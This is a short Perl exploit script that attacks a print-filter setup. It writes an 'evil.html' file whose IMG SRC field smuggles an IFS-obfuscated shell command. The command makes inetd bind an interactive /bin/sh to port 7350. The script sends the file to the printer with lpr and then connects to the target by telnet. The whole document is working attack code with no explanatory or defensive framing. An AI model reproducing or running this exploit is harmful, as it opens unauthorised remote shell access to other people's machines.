#!/usr/bin/perl -W

sub usage

{

	print "\n$0 <printhost> <remote-host>\n".
	      "\tprinthost   -- name of printer in /etc/printcap\n".
	      "\tremote-host -- IP or hostname of host where shell appears\n".
	      "'$0 lp 127.0.0.1' is recommended for everyones own machine\n\n";
	exit;

}

my $printhost = shift || usage();
my $remote = shift || usage();

print "Constructing evil.html ...\n";

open O, ">evil.html" or die $!;

print O<<__eof__;

<HTML>

<IMG 
SRC="|IFS=A;X=A;echo\${X}7350\${X}stream\${X}tcp\${X}nowait\${X}lp\
${X}/bin/sh\${X}-i|dd\${X}of=/tmp/f;inetd\${X}/tmp/f">

</HTML>

__eof__



close O;



if (fork() == 0) {

	exec("/usr/bin/lpr", "-P", $printhost, "evil.html");

}

wait;

sleep 3;

print "Connecting ...\n";

exec("/usr/bin/telnet", $remote, 7350);






